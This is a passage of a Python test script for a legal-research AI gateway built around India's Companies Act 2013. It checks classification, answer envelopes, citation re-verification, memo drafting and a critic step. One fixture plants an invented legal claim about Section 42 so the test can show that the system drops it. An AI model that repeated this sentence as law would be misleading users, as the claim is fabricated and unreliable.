          "conversation.send WRITES -- it creates a thread, appends messages and may "
          "enqueue work -- so mcp_tools() keeps it off MCP, by rule and not by the author "
          "remembering")
    for ro in ("conversation.list", "conversation.get", "citation.get"):
        check(ro not in write_verbs() and f"{MCP_NAMESPACE}.{ro}" in {t.name for t in mcp},
              f"...while {ro} is read-only and does reach MCP")
    check(not {t.name for t in mcp} & {f"{MCP_NAMESPACE}.runs.submit",
                                       f"{MCP_NAMESPACE}.runs.cancel"},
          "...so neither runs.submit nor runs.cancel reaches MCP")

    # ── intake.classify (PLAN_23 layer 1) ───────────────────────────────────
    check("intake.classify" not in write_verbs(),
          "intake.classify is read-only, so it reaches MCP")
    check(f"{MCP_NAMESPACE}.intake.classify" in {t.name for t in mcp},
          "...and it does")
    _ictx = Context()
    _i = by_name()["intake.classify"].run(
        {"message": "Please review the attached share purchase agreement.",
         "files": [{"name": "spa-final.docx", "type": "application/pdf"}]}, _ictx)
    check(_i["task"] == "REVIEW_CONTRACT", f"a contract with a review verb -> "
                                           f"REVIEW_CONTRACT ({_i['task']})")
    check("run_id" not in _i and _ictx.last_steps == [],
          "**the verb never runs the task**: no run_id comes back and no step was built")
    check(len(_i["alternatives"]) == 2 and _i["reason"],
          f"...with two alternatives and a reason ({_i['alternatives']})")
    _u = by_name()["intake.classify"].run(
        {"files": [{"name": "board-minutes.pdf", "type": "application/pdf"}]}, _ictx)
    check(_u["task"] == "NEEDS_CLARIFICATION" and len(_u["options"]) == 2
          and _u["question"].endswith("?"),
          f"minutes with no instruction -> NEEDS_CLARIFICATION, two options, one question "
          f"({_u['task']})")
    check("alternatives" not in _u,
          "...and the undecided shape carries `options`, never `alternatives`")
    _e = by_name()["intake.classify"].run(
        {"message": "We are allotting shares to a new investor next week."}, _ictx)
    check(_e["task"] == "EVENT_ASSESS" and _e["event"] == "share_allotment",
          f"an event stated -> EVENT_ASSESS naming the event ({_e.get('event')})")
    _o = by_name()["intake.classify"].run(
        {"message": "Under the IBC, what is the CIRP timeline?"}, _ictx)
    check(_o["task"] in [t for t in __import__("agents.intake", fromlist=["TASKS"]).TASKS],
          f"an unheld-body question still CLASSIFIES ({_o['task']}) -- the refusal belongs "
          f"to the ask path, and intake does not duplicate it")
    check(by_name()["intake.classify"].run({}, _ictx)["status"] == "REFUSED",
          "nothing to classify is a BAD_REQUEST, not an empty classification")

    # ── C2: the conversation layer ──────────────────────────────────────────
    from gateway import envelope as _ev
    from gateway.store import MemoryBackend as _MB
    _st = _MB()
    _cctx = Context(store=_st, clock=lambda: "2026-10-01T00:00:00+00:00")
    _V = by_name()

    # The envelope validates for every task conversation.send can produce.
    _r = _V["conversation.send"].run(
        {"text": "What is the quorum for a meeting of the Board?"}, _cctx)
    _cid = _r["conversation_id"]
    _e = _r["envelope"]
    check(_ev.errors(_e) == [], f"conversation.send returns a VALID envelope ({_ev.errors(_e)})")
    check(_e["schema"] == _ev.SCHEMA_ID, f"...stamped {_ev.SCHEMA_ID}")
    check(_e["task"] == "RESEARCH_QUESTION" and _e["as_of"] == "2026-10-01",
          f"...with the task and the as_of date ({_e['task']}, {_e['as_of']})")
    check([b["body_id"] for b in _e["bodies"]] == ["CA2013"],
          f"...and CA2013 in bodies ({[b['body_id'] for b in _e['bodies']]})")

    for _t, _args in [("RESEARCH_QUESTION", {"text": "What is the quorum for the Board?"}),
                      ("EVENT_ASSESS", {"text": "We are allotting shares next week.",
                                        "event": "share_allotment"}),
                      ("COMPANY_STANDING", {"text": "Are we compliant with our filings?"}),
                      ("LAW_CHANGES", {"text": "What changed in the Act since April 2024?"})]:
        _o = _V["conversation.send"].run({**_args, "conversation_id": _cid}, _cctx)
        check(_ev.errors(_o["envelope"]) == [],
              f"the envelope validates for {_t} ({_ev.errors(_o['envelope'])[:1]})")
        check(_o["envelope"]["task"] == _t, f"...and its task is {_t}")

    # A task with no verb ABSTAINS and says so, rather than returning an empty answer.
    _cs = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Are we compliant with our annual filings?"}, _cctx)
    check(_cs["envelope"]["status"] == _ev.ABSTAINED
          and "cannot answer one yet" in _cs["envelope"]["text_blocks"][0]["text"],
          "a task no verb serves ABSTAINS and says so in words -- an empty answer would "
          "read as 'no obligation found'")
    check(_cs["envelope"]["bodies"] == [],
          "...and claims nothing about any body")

    # A CA2013 + FEMA question is PARTIAL with FEMA NOT_HELD.
    from checker import scope as _scope
    _mixed = _ev.build(
        status=_ev.PARTIAL, task="RESEARCH_QUESTION", as_of="2026-10-01",
        text_blocks=[{"text": "The Act's allotment return is filed.", "citation_ids": []}],
        bodies=[_ev.body("CA2013", _scope.body("CA2013").name, _ev.B_ANSWERED, "held"),
                _ev.body("FEMA1999", _scope.body("FEMA1999").name, _ev.B_NOT_HELD,
                         _scope.refusal_for("FEMA1999"))])
    check(_mixed["status"] == "PARTIAL", "a CA2013 + FEMA envelope is PARTIAL")
    _bi = {b["body_id"]: b["status"] for b in _mixed["bodies"]}
    check(_bi == {"CA2013": "ANSWERED", "FEMA1999": "NOT_HELD"},
          f"...CA2013 ANSWERED and FEMA1999 NOT_HELD ({_bi})")
    check(_scope.body("FEMA1999").status == _scope.DECLARED,
          "...and NOT_HELD is read from checker/scope.py, not asserted here")

    # A scanned PDF shows CANNOT_READ with a reason.
    _scan = _V["documents.upload"].run(
        {"name": "scan0001.pdf",
         "cannot_read": "no text layer on any of 1 page(s); this looks like a scan"}, _cctx)
    check(_scan["state"] == "CANNOT_READ" and _scan["reason"],
          f"a scan uploads as CANNOT_READ with its reason ({_scan['state']})")
    _sr = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Please review this.",
         "file_ids": [_scan["document_id"]]}, _cctx)
    _f = _sr["envelope"]["files"][0]
    check(_f["state"] == "CANNOT_READ" and "text layer" in (_f["reason"] or ""),
          f"...and the envelope's file panel shows CANNOT_READ with the reason "
          f"({_f['state']}, {(_f['reason'] or '')[:34]!r})")
    check(_ev.errors(_sr["envelope"]) == [], "...and that envelope validates")
    _real = _V["documents.upload"].run(
        {"text": "MINUTES OF THE BOARD MEETING. Present: three directors.",
         "name": "minutes.pdf"}, _cctx)
    _rr = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Please review the minutes.",
         "file_ids": [_real["document_id"]]}, _cctx)
    check(_rr["envelope"]["files"][0]["state"] == "READ",
          f"...while a document that WAS read shows READ -- the first version of this "
          f"reported every real upload as unreadable "
          f"({_rr['envelope']['files'][0]['state']})")
    _unknown = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Review this.", "file_ids": ["0" * 64]}, _cctx)
    check(_unknown["envelope"]["files"][0]["state"] == "CANNOT_READ",
          "...and a file_id we hold nothing for is CANNOT_READ, never omitted")
    check(_V["documents.upload"].run({"name": "x.pdf", "cannot_read": "bad"},
                                     _cctx)["status"] == "REFUSED",
          "a cannot_read with no real reason is refused: 'unreadable' with no why invites "
          "the reader to assume the document was empty")

    # A transport error gives FAILED, and FAILED is never a refusal.
    _fail = _envelope_for("RESEARCH_QUESTION",
                          {"status": "FAILED", "error": "ReadTimeout: provider"},
                          as_of="2026-10-01", run_id=None, files=[], ctx=_cctx)
    check(_fail["status"] == "FAILED" and _ev.errors(_fail) == [],
          "a transport error becomes a valid FAILED envelope")
    check(not _ev.is_refusal(_fail) and _fail["bodies"] == [] and _fail["citations"] == [],
          "...and FAILED is NOT a refusal, and carries no bodies and no citations")
    check("not a finding about the law" in _fail["text_blocks"][0]["text"],
          "...and says so in words")

    # The thread, in order, with the envelope stored.
    _g = _V["conversation.get"].run({"conversation_id": _cid}, _cctx)
    check([m["ordinal"] for m in _g["messages"]]
          == list(range(len(_g["messages"]))),
          "conversation.get returns the messages in ordinal order with no gaps")
    check(all(m["envelope"] is None for m in _g["messages"] if m["role"] == "user"),
          "...a user message never carries an envelope")
    check(all(m["envelope"] is not None for m in _g["messages"]
              if m["role"] == "assistant"),
          "...and every assistant message here does")
    check(any(c["conversation_id"] == _cid
              for c in _V["conversation.list"].run({}, _cctx)["conversations"]),
          "conversation.list shows the thread")
    check(_V["conversation.get"].run({"conversation_id": "nope"}, _cctx)["status"]
          == "REFUSED", "an unknown conversation is REFUSED, not an empty thread")
    check(_V["conversation.send"].run({}, _cctx)["status"] == "REFUSED",
          "a send with neither text nor a file is refused")
    check(_V["conversation.send"].run({"text": "x", "task_override": "SUMMARISE"},
                                      _cctx)["status"] == "REFUSED",
          "a task_override outside the six is refused")
    _ov = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "anything at all",
         "task_override": "RESEARCH_QUESTION"}, _cctx)
    check(_ov["envelope"]["task"] == "RESEARCH_QUESTION"
          and _ov["classification"]["decided_by"] == "override",
          "...and a valid override skips intake, recorded as decided_by=override")
    check(_V["conversation.send"].run({"text": "x"}, Context())["status"] == "REFUSED",
          "a send with no store is REFUSED -- returning a thread that vanishes on restart "
          "would be a lie about what was saved")

    # citation.get re-verifies rather than trusting the stored envelope.
    check(_V["citation.get"].run({"citation_id": "c1"}, _cctx)["status"] == "REFUSED",
          "citation.get without a conversation_id is refused: the read is governed by the "
          "tenant's own policy on that thread")
    check(_V["citation.get"].run({"citation_id": "nope", "conversation_id": _cid},
                                 _cctx)["status"] == "REFUSED",
          "...and an unknown citation id is REFUSED, never an empty citation")

    # ══ REVIEW FINDINGS ON PR #27 ════════════════════════════════════════════

    # ── 1. the model must be REACHABLE, checked against the real pre-send guard ─
    # `_served_or_refusal((), ...)` passed NO origin, and `public_only.verify_prompt`
    # refuses a prompt with no origin to clear against -- so the classifier could never be
    # called, and every unmatched message came back NEEDS_CLARIFICATION because of
    # NotPublic. The user's own typed words are MATTER text, not published corpus text,
    # and clear_matter is the path for them.
    from agents import intake as _ik
    from checker import public_only as _po
    _msg = "zzz mmm"
    _org = _intake_origin(_msg)
    check(_org is not None and _org.basis == _po.MATTER,
          f"the intake classifier clears the user's message as MATTER text "
          f"({getattr(_org, 'basis', None)})")
    # THE REAL PRE-SEND CHECK. No stub: this is the function azure_model.narrate calls.
    _cleared = _po.verify_prompt(_ik.prompt_for(_msg), _org)
    check(len(_cleared) == 1 and _msg in _cleared[0],
          f"...and the REAL verify_prompt clears the classification prompt against it "
          f"({len(_cleared)} block(s))")
    try:
        _po.verify_prompt(_ik.prompt_for(_msg), ())
        check(False, "...while no origin is refused, which is what used to happen")
    except _po.NotPublic as e:
        check("nothing to clear" in str(e),
              f"...while NO origin is refused by that same guard ({e!s:.44}) -- the bug")
    _ic = by_name()["intake.classify"].run({"message": _msg}, Context())
    check(_ic["task"] != "NEEDS_CLARIFICATION",
          f"an unmatched message never comes back NEEDS_CLARIFICATION for want of a "
          f"clearance; it reaches the model or falls back to RESEARCH_QUESTION "
          f"(got {_ic['task']} by {_ic['rule']})")
    check(_ic["task"] == "RESEARCH_QUESTION", f"...here, the fallback ({_ic['task']})")

    # ── 5. a list field is declared ARRAY, and MCP says so ──────────────────
    _by = {v.name: v for v in VERBS}
    _arr = [(v.name, f.name) for v in VERBS for f in v.inputs if f.kind == ARRAY]
    check(("intake.classify", "files") in _arr,
          f"intake.classify.files is declared ARRAY, not OBJECT -- it takes a list "
          f"({_arr})")
    _schemas = {t.name: t.schema for t in mcp_tools()}
    _s = _schemas[f"{MCP_NAMESPACE}.intake.classify"]["properties"]["files"]
    check(_s["type"] == "array",
          f"...and the MCP inputSchema says array, matching what the verb accepts "
          f"({_s['type']!r})")
    for _vn, _fn in _arr:
        _t = _schemas.get(f"{MCP_NAMESPACE}.{_vn}")
        if _t is None:                      # a write verb: not on MCP at all
            continue
        check(_t["properties"][_fn]["type"] == "array",
              f"{_vn}.{_fn}: MCP declares array, matching the handler")
    # And a field declared ARRAY must actually be refused when handed an object.
    check(by_name()["intake.classify"].run(
              {"message": "x", "files": {"name": "a.pdf"}}, Context())["status"]
          == "REFUSED",
          "a field declared ARRAY is REFUSED when handed an object, so the declaration "
          "and the handler agree")

    # ── 6. a non-string message is BAD_REQUEST, not a 500 ───────────────────
    for _bad in (5, 5.5, True, {"a": 1}, ["x"]):
        _r6 = by_name()["intake.classify"].run({"message": _bad}, Context())
        check(_r6.get("status") == "REFUSED" and _r6.get("code") == "BAD_REQUEST",
              f"message={_bad!r} is BAD_REQUEST, not an exception "
              f"({_r6.get('status')}/{_r6.get('code')})")
    check(by_name()["intake.classify"].run({"message": None,
                                            "files": [{"name": "nda.docx"}]},
                                           Context())["task"] in
          ("NEEDS_CLARIFICATION", "REVIEW_CONTRACT"),
          "...while message=None with a file is still classified: absent is not malformed")

    # ── 7 (caller side). One classify call, no rule-name matching ───────────
    _src = __import__("inspect").getsource(_intake_classify)
    check("default_no_attachment" not in _src
          and "attachment+unrecognised_instruction" not in _src,
          "the verb no longer matches intake's RULE NAMES to guess whether a model is "
          "wanted -- that coupled the gateway to the module's internals")
    check(_src.count("intake.classify(") == 1,
          f"...and calls classify() exactly ONCE, so the rules cannot disagree with "
          f"themselves between two runs ({_src.count('intake.classify(')})")
    check("model_provider" in _src,
          "...passing a model_provider, which classify() calls lazily and only if the "
          "rules did not decide")

    # ══ C2 GAPS, found by auditing the envelope against the spec ═════════════
    # Measured before any of this was written: citations[] was 0 for every task, bodies[]
    # empty for four of six, READING and PARTIAL and NEEDS_LAWYER never produced, and
    # `_bodies_from_ask` read two keys (`out_of_scope_bodies`, `refusal`) that the `ask`
    # verb does not return -- so the FEMA branch was dead code and the spec's own named
    # case failed end to end.
    _gctx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00")
    _gV = by_name()

    def _send(**kw):
        return _gV["conversation.send"].run({"conversation_id": "c-gap", **kw}, _gctx)

    # ── the spec's named case: CA2013 + FEMA -> PARTIAL, FEMA NOT_HELD ──────
    # PARTIAL means part was ANSWERED and part was not held, so the question has to be one
    # the Act really answers part of. This one is: the quorum is s.174, and FEMA is named
    # alongside it.
    _mx = _send(text="What is the quorum for a meeting of the Board under the Companies "
                     "Act, and does FEMA affect it?")["envelope"]
    _mb = {b["body_id"]: b for b in _mx["bodies"]}
    check(_mx["status"] == "PARTIAL",
          f"a CA2013 + FEMA question is PARTIAL end to end, through conversation.send "
          f"(got {_mx['status']})")
    check(_mb.get("FEMA1999", {}).get("status") == "NOT_HELD",
          f"...with FEMA1999 NOT_HELD ({sorted(_mb)})")
    check("CA2013" in _mb and _mb["CA2013"]["status"] == _ev.B_ANSWERED,
          f"...and CA2013 ANSWERED ({_mb.get('CA2013', {}).get('status')})")
    from checker import scope as _sc
    check(_mb["FEMA1999"]["note"] == _sc.refusal_for("FEMA1999"),
          "...and FEMA's note is the REGISTER'S OWN refusal text, not a sentence composed "
          "here")
    # And the case that must NOT be PARTIAL: a second body is named, but the Act has
    # nothing on point, so nothing was answered. ABSTAINED is the honest outcome and
    # PARTIAL here would be a claim to have answered half of it.
    _mx0 = _send(text="Under the Companies Act and FEMA, what applies when a foreign "
                      "investor subscribes to shares?")["envelope"]
    _mb0 = {b["body_id"]: b["status"] for b in _mx0["bodies"]}
    check(_mx0["status"] == _ev.ABSTAINED and _mb0.get("CA2013") == _ev.B_NEED_FACT,
          f"...while a mixed question the Act has NOTHING on point for is ABSTAINED with "
          f"CA2013 NEED_FACT -- PARTIAL would claim half an answer that does not exist "
          f"({_mx0['status']}, {_mb0})")
    check(_mb0.get("FEMA1999") == "NOT_HELD",
          "...and FEMA is still named NOT_HELD in it")

    # ── a question wholly about unheld law: ABSTAINED, and the body named ───
    _ibc = _send(text="Under the IBC, what is the CIRP timeline?")["envelope"]
    _ib = {b["body_id"]: b for b in _ibc["bodies"]}
    check(_ibc["status"] == _ev.ABSTAINED,
          f"a question wholly about unheld law ABSTAINS ({_ibc['status']})")
    check(_ib.get("IBC2016", {}).get("status") == "NOT_HELD",
          f"...naming IBC2016 NOT_HELD ({sorted(_ib)})")

    # ── bodies[] for the tasks that had none ────────────────────────────────
    _rdoc = _send(text="Check the minutes of the board meeting.")["envelope"]
    check([b["body_id"] for b in _rdoc["bodies"]] == ["CA2013"],
          f"REVIEW_DOCUMENT names CA2013: SS-1/SS-2 are read against the Act "
          f"({[b['body_id'] for b in _rdoc['bodies']]})")
    _up = _gV["documents.upload"].run(
        {"text": "1. The Receiving Party shall keep Confidential Information secret.",
         "name": "mutual-nda.docx"}, _gctx)
    _rc = _send(text="Please review this NDA against our playbook.",
                file_ids=[_up["document_id"]], test_data="fixture")["envelope"]
    _rcb = {b["body_id"]: b for b in _rc["bodies"]}
    check("CONTRACT1872" in _rcb and _rcb["CONTRACT1872"]["status"] == "NOT_HELD",
          f"REVIEW_CONTRACT names the Contract Act as NOT_HELD -- a playbook finding is a "
          f"company standard and never a statement of law ({sorted(_rcb)})")

    # ── NEEDS_LAWYER, which nothing produced ───────────────────────────────
    check(_rc["status"] == _ev.NEEDS_LAWYER,
          f"a contract review REQUIRES a lawyer: every finding is a POTENTIAL_ISSUE "
          f"against a company standard, so no machine outcome closes it "
          f"(got {_rc['status']})")

    # ── READING, which nothing produced ────────────────────────────────────
    from gateway.jobs import MemoryQueue as _MQ
    _qctx = Context(store=_MB(), queue=_MQ(), clock=lambda: "2026-10-01T00:00:00+00:00")
    _qu = by_name()["documents.upload"].run(
        {"text": "MINUTES OF THE BOARD MEETING.", "name": "minutes.pdf"}, _qctx)
    _qr = by_name()["conversation.send"].run(
        {"text": "Please check these minutes.", "file_ids": [_qu["document_id"]]}, _qctx)
    check(_qr.get("run_id") and _qr.get("envelope") is None,
          f"queued work returns a run_id at once with no envelope yet "
          f"({_qr.get('run_id') is not None})")
    check(_qr.get("files") and _qr["files"][0]["state"] == _ev.READING,
          f"...and the file panel says READING while the worker has it "
          f"({(_qr.get('files') or [{}])[0].get('state')})")

    # ── every status is reachable, and FAILED only by the transport path ────
    _nc = _gV["conversation.send"].run(
        {"conversation_id": "c-gap2",
         "file_ids": [_gV["documents.upload"].run(
             {"text": "MINUTES OF THE BOARD MEETING.",
              "name": "board-minutes.pdf"}, _gctx)["document_id"]]}, _gctx)
    _plain = _send(text="What is the quorum for a meeting of the Board?")["envelope"]
    check(_plain["status"] == _ev.ANSWERED,
          f"a question wholly within held law is ANSWERED ({_plain['status']})")
    _seen = {_mx["status"], _ibc["status"], _rdoc["status"], _rc["status"],
             _nc["envelope"]["status"], _plain["status"]}
    check({_ev.ANSWERED, _ev.PARTIAL, _ev.NEEDS_LAWYER, _ev.ABSTAINED,
           _ev.NEEDS_CLARIFICATION} <= _seen,
          f"every LEGAL status is reachable from conversation.send -- before this, only "
          f"ANSWERED and ABSTAINED were ({sorted(_seen)})")
    check(_ev.FAILED not in _seen,
          "...and FAILED is not among them: it is reachable only through the transport "
          "path, never from a task that ran")

    # ── as_of: never stamp a date the engine did not read as at ────────────
    _past = _send(text="What is the quorum for a meeting of the Board?",
                  as_of="2017-04-01")
    check(_past.get("status") == "REFUSED" or
          _past["envelope"]["as_of"] == "2026-10-01",
          f"a PAST as_of is refused rather than stamped on an answer read as at today -- "
          f"point-in-time reconstruction is UNVERIFIED (CLAUDE.md), and an envelope "
          f"claiming 2017-04-01 over today's text is the retracted mistake with a field "
          f"name on it (got {_past.get('status')}/"
          f"{(_past.get('envelope') or {}).get('as_of')})")
    check(_send(text="What is the quorum?")["envelope"]["as_of"] == "2026-10-01",
          "...while today's date is stamped normally")

    # ══ citations: a real Evidence round-trip ════════════════════════════════
    from agents import research_question as _rq
    _q = "What is the quorum for a meeting of the Board?"
    _srcs = tuple(_s for _s, _o in _rq.evidence(_q))
    _cctx2 = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00",
                     model_for=lambda _o: _rq.quoting_model(_srcs))
    _cr = by_name()["conversation.send"].run({"text": _q}, _cctx2)
    _ce = _cr["envelope"]
    check(len(_ce["citations"]) >= 1,
          f"citations[] is POPULATED from the research path -- it was 0 for every task "
          f"({len(_ce['citations'])})")
    _c1 = _ce["citations"][0]
    for _f in ("id", "instrument", "provision", "source", "fetched_at", "sha256", "quote"):
        check(bool(_c1.get(_f)), f"...citation carries {_f} ({str(_c1.get(_f))[:30]!r})")
    check(_c1["instrument"] == "Companies Act 2013" and _c1["provision"].startswith("s."),
          f"...instrument and provision are split, not one string "
          f"({_c1['instrument']} / {_c1['provision']})")
    check(len(_c1["sha256"]) == 64 and _c1["source"].startswith("corpus/"),
          f"...the sha256 is the CORPUS FILE's and the source is its repo path "
          f"({_c1['source']})")
    check(_c1.get("in_force_from") is None,
          "...in_force_from is NULL: the corpus record does not carry a per-section "
          "commencement date, and a statutory date guessed here would be invented")
    check(_ev.errors(_ce) == [], f"...and the envelope validates ({_ev.errors(_ce)[:1]})")
    check([b["citation_ids"] for b in _ce["text_blocks"]][0] == [c["id"] for c in
                                                                _ce["citations"]],
          "...the text block references exactly the citations that survived")

    # Every quote really is in the section it names -- re-read, not trusted.
    for _c in _ce["citations"]:
        _ok, _why = verify_citation(_c)
        check(_ok, f"{_c['id']}: the quote byte-matches {_c['provision']} on re-read "
                   f"({_why[:54]})")

    # ── a quote that no longer byte-matches is DROPPED, never shown ─────────
    _bent = dict(_c1, id="bent",
                 quote="(1) The quorum for a meeting of the Committee of Auditors")
    _ok, _why = verify_citation(_bent)
    check(not _ok and "NOT present" in _why,
          f"a bent quote fails re-verification ({_why[:60]})")
    _kept, _dropped = _citations_for("RESEARCH_QUESTION",
                                     {"citations": [_c1, _bent]})
    check([c["id"] for c in _kept] == [_c1["id"]] and [c["id"] for c in _dropped] == ["bent"],
          f"...and is DROPPED, not flagged ({[c['id'] for c in _kept]} kept, "
          f"{[c['id'] for c in _dropped]} dropped)")
    _benv = _envelope_for("RESEARCH_QUESTION",
                          {"citations": [_c1, _bent], "answer": "The quorum is...",
                           "provisions": ["Companies Act 2013, s.174"]},
                          as_of="2026-10-01", files=[], ctx=_cctx2, question=_q)
    check("bent" not in [c["id"] for c in _benv["citations"]],
          "...and never reaches the envelope")
    check(any("dropped" in b["text"] for b in _benv["text_blocks"]),
          "...while the DROP IS STATED in the answer, because a reader is looking at "
          "something different from what we first built")
    check(_ev.errors(_benv) == [], "...and that envelope still validates")

    # The other two ways it can fail, each a different fact.
    _moved = dict(_c1, id="moved", sha256="0" * 64)
    _ok2, _why2 = verify_citation(_moved)
    check(not _ok2 and "has changed since" in _why2,
          f"a citation whose corpus file has CHANGED is not re-verified against text we "
          f"did not read ({_why2[:50]})")
    _gone = dict(_c1, id="gone", provision="s.99999")
    _ok3, _why3 = verify_citation(_gone)
    check(not _ok3 and "no longer holds" in _why3,
          f"a citation naming a section the corpus does not hold fails ({_why3[:46]})")
    check(verify_citation(dict(_c1, provision=""))[0] is False,
          "...and one naming no provision has nothing to re-read")

    # ══ job 3: a draft built from a run, and a fabricated claim dropped ═════
    # End to end on the same context: ask, then draft from the answer. Nothing hand-built
    # -- the memo reads the run `conversation.send` really stored.
    _dcid = _cr["conversation_id"]
    _tmpl, _src, _srid = _draft_source(_dcid, _cctx2)
    check(_tmpl == "research_memo" and _srid == _cr["run_id"],
          f"a RESEARCH_QUESTION turn is a memo's source run ({_tmpl}/{_srid})")
    check(_src.get("question") == _q,
          "...and the question comes from the run's own arguments, because `ask` returns "
          "the answer and not the question")
    check((_cctx2.store.read_run(_srid) or {}).get("result") is not None,
          "...which is readable only because an inline run now STORES its result -- it "
          "was status=ANSWERED with result=NULL, a row claiming an answer and keeping "
          "none of it")
    _fake = ("Section 42 of the Companies Act requires a special resolution for every "
             "allotment of shares.")
    _dr = by_name()["conversation.send"].run(
        {"conversation_id": _dcid, "text": "Draft a memo for the file about this.",
         "prose": [{"text": "This note records the position for the file.",
                    "citation_ids": []},
                   {"text": _fake, "citation_ids": []}]}, _cctx2)
    check(_dr["envelope"]["task"] == "DRAFT" and bool(_dr.get("draft_id")),
          f"...the next turn is a DRAFT and a draft exists ({_dr['envelope']['task']})")
    check(_dr.get("template") == "research_memo" and _dr.get("drafted_from") == _srid,
          f"...built from that run, with the template named ({_dr.get('template')})")
    check(len(_dr.get("dropped_claims") or []) == 1,
          f"THE FABRICATED LEGAL CLAIM IS DROPPED end to end "
          f"({len(_dr.get('dropped_claims') or [])} dropped)")
    _ver = by_name()["draft.versions"].run({"draft_id": _dr["draft_id"]}, _cctx2)
    _v1 = _ver["versions"][0]
    check(_fake not in _v1["body"] and
          all(_fake not in (sl.get("value") or "") for sl in _v1["slots"]),
          "...and it is in NO part of the stored version -- not the body, not a slot")
    check(_c1["quote"] in _v1["body"],
          "...while the law in the memo is the run's own citation, quoted verbatim")
    _dstat = by_name()["draft.status"].run({"draft_id": _dr["draft_id"]}, _cctx2)
    check(any(sl["type"] == "MODEL_SUGGESTION" and sl["blocks_approval"]
              for sl in _v1["slots"]) and len(_dstat.get("blocking") or []) >= 1,
          f"...the connecting sentence is a MODEL_SUGGESTION and BLOCKS approval "
          f"({_dstat.get('blocking')})")
    check(_dstat.get("ready_for_approval") is False,
          "...so the draft is NOT ready for approval until a person accepts or edits it")
    check(any("DROPPED" in b["text"] for b in _dr["envelope"]["text_blocks"]),
          "...and the drop is STATED in the reply, not left in a field a client may not "
          "render")
    check(_ev.errors(_dr["envelope"]) == [], "...and that envelope validates")

    # ══ layer 7: the critic ═════════════════════════════════════════════════
    # `_crit`, not `_cr`: `_cr` already holds the conversation.send result used further
    # down, and shadowing it turned a dict into a module.
    from checker import critic as _crit

    def _critic_model(_origins):
        def call(prompt):
            if "Your ONLY job is to object" in prompt:
                return ("REMOVE s1: the span does not support this as stated\n"
                        "REWRITE s1: here is better wording\n")
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _c7 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_critic_model)
    _cv = by_name()["ask"].run({"question": _q, "critic": "true"}, _c7)
    _cd = _cv.get("critic") or {}
    check(_cd.get("removed") and _cd["removed"][0]["claim_id"] == "s1",
          f"the critic REMOVES a sentence the verifier had admitted ({_cd.get('removed')})")
    check(any("REMOVED" in t for t in _cd.get("trace") or []),
          "...and every removal is in the trace")
    check(any(r["action"] == "REWRITE" for r in _cd.get("refused") or []),
          "**a REWRITE is REFUSED**: the critic may flag or remove and nothing else")
    check(not any("better wording" in str(v) for v in _cv.values()),
          "...and the wording it proposed reaches no part of the answer")
    check(_cd.get("removals_allowed") == 1,
          "...and the result names the one-removal bound it applied")

    # The case that would have shipped silently: everything removed.
    check(_cv.get("status") == "NEEDS_LAWYER",
          f"when the critic objects to EVERY sentence the answer is NEEDS_LAWYER, not an "
          f"ANSWERED with an empty body ({_cv.get('status')})")
    check("not a finding that no obligation exists" in str(_cv.get("critic_note")),
          "...and says so, because an empty ANSWERED reads as 'nothing applies'")

    # Off unless asked for, and a broken critic changes nothing.
    _plain = by_name()["ask"].run({"question": _q}, Context(
        store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
        model_for=lambda _o: _rq.quoting_model(_srcs)))
    check("critic" not in _plain,
          "the critic does NOT run unless asked: it can only subtract, and subtracting "
          "from every answer by default is a behaviour change nobody opted into")
    check("critic" in {f.name for f in by_name()["ask"].inputs},
          "...and it is a FIELD on ask, not a new verb")
    _broke = _crit.review([{"id": "s1", "text": "x"}],
                        critique=lambda c: (_ for _ in ()).throw(TimeoutError("down")))
    check([c["id"] for c in _broke.kept] == ["s1"] and "did not run" in _broke.note,
          "a critic that raises leaves the answer exactly as the verifier produced it")

    # ══ CAL-1: the nonconformity score on a real run ════════════════════════
    check(nonconformity_for(entailed=8, traced=10, total=10, escalations=1)[0] == 0.7,
          "the founder's formula: (1 - 8/10) + 0.5*1 = 0.7")
    _ncs, _ncw = nonconformity_for(entailed=None, traced=3, total=4)
    check(_ncs is None and "no entailment verdict" in _ncw,
          f"a path with NO entailment verdict records NO score, and the note says which "
          f"half is missing ({_ncw[:46]!r})")
    check("different measurement under the same name" in _ncw,
          "...and why scoring from the byte match alone is not a fallback")
    check(nonconformity_for(entailed=None, traced=0, total=0) == (None, None),
          "a run with no sentences records neither a score nor a reason: nothing ran")
    _ncctx = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                     model_for=lambda _o: _rq.quoting_model(_srcs))
    _ncr = by_name()["ask"].run({"question": _q}, _ncctx)
    _ncrow = _ncctx.store.read_run(_ncr["run_id"]) or {}
    check("nonconformity" in _ncrow,
          "**every run now carries the field**, whether or not it could be computed")
    check(_ncrow.get("nonconformity") is None
          and "byte-matched" in str(_ncrow.get("nonconformity_note") or ""),
          f"...and a real ask records NULL with the reason, because the ask path produces "
          f"TRACED and not entailment ({_ncrow.get('nonconformity')})")

    # ══ job 6b: orphaned citations, and the CRITIC_ENABLED gate ═════════════
    import os as _os

    class _Sent:
        def __init__(self, text):
            self.text, self.traced = text, True

    class _Summ:
        def __init__(self, sents):
            self.sentences = sents

    _before = {"citations": [{"id": "c1", "provision": "s.174"},
                             {"id": "c2", "provision": "s.173"},
                             {"id": "c3", "provision": "s.96"}], "answer": "A\nB"}
    _summ = _Summ([_Sent("Sentence A."), _Sent("Sentence B.")])
    _idx = {1: ["c1", "c3"], 2: ["c2", "c3"]}          # c3 is SHARED

    def _removes_s2(_ctx):
        def critique(claims):
            return [{"claim_id": "s2", "action": "REMOVE",
                     "reason": "the span does not support this as stated"}]
        critique.sources = []
        return critique

    _saved_for = _critic_for
    try:
        globals()["_critic_for"] = _removes_s2
        _oc = _apply_critic(_before, _summ, Context(store=_MB()), cite_index=_idx)
    finally:
        globals()["_critic_for"] = _saved_for
    check([c["id"] for c in _oc["citations"]] == ["c1", "c3"],
          f"**a citation only the REMOVED sentence used is dropped** "
          f"({[c['id'] for c in _oc['citations']]})")
    check(_oc["critic"]["dropped_citations"] == ["c2"],
          "...c2 is named as dropped")
    check("c3" in [c["id"] for c in _oc["citations"]],
